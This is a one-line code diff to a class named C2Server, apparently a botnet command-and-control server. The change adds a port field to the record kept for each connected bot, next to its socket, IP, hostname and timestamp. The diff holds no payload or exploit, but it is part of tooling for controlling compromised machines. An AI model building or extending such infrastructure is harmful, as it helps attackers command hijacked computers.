@@ -37,6 +37,7 @@ class C2Server:
                 ACTIVE_BOTS[session_id] = {
                     'socket': client_socket,
                     'ip': addr[0],
+                    'port': addr[1],
                     'host': socket.gethostbyaddr(addr[0])[0],
                     'timestamp': time.time()
                 }
